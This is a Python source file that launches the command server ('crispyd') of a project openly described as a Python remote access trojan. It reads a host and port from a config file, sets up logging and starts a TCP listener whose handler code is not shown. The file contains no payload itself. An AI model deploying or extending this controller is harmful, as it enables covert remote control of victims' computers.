import argparse
import logging
import ConfigParser

from crispy.network.server_handler import CrispyTCPServerHandler
from crispy.lib.server import CrispyTCPServer
    
def main():
    argp = argparse.ArgumentParser(description="Crispy-fortnight (Python RAT) daemon console.",
                                   epilog="Do NOT use this for nefarious purposes!", 
                                   prog="crispyd")
    argp.add_argument("--config",
                        dest="config_file",
                        help="Path to crispy config file",
                        metavar="<config_file>",
                        required=True,
                        type=str)
    argp.add_argument("--loglvl",
			choices=["DEBUG", "ERROR", "INFO", "WARNING"],
			default="WARNING",
			dest="loglevel",
			help="Change log verbosity",
			type=str)
    argp.add_argument("--version", 
                        action="version", 
                        version="1.0")
    args = argp.parse_args()

    if args.loglevel == "DEBUG":
	loglevel = logging.DEBUG
    elif args.loglevel == "ERROR":
	loglevel = logging.ERROR
    elif args.loglevel == "INFO":
	loglevel = logging.INFO
    else:
	loglevel = logging.WARNING
    
    logging.basicConfig(datefmt='%m/%d/%Y %I:%M:%S %p',
			filename='crispy.log',
			format='%(asctime)-15s - %(levelname)-5s - %(message)s',
			level=loglevel)

    config = ConfigParser.ConfigParser()
    config.read(args.config_file)
    
    host = config.get('DAEMON', 'host')
    port = config.getint('DAEMON', 'port')

    try:
        server = CrispyTCPServer((host, port), CrispyTCPServerHandler)
        logging.info("Started server on {0}:{1}".format(server.server_address[0], server.server_address[1]))
        server.serve_forever()
    except KeyboardInterrupt:
        logging.info("Shutting down server")
        logging.shutdown()
        server.shutdown()
        server.socket.close()
 
if __name__ == "__main__":
    main()
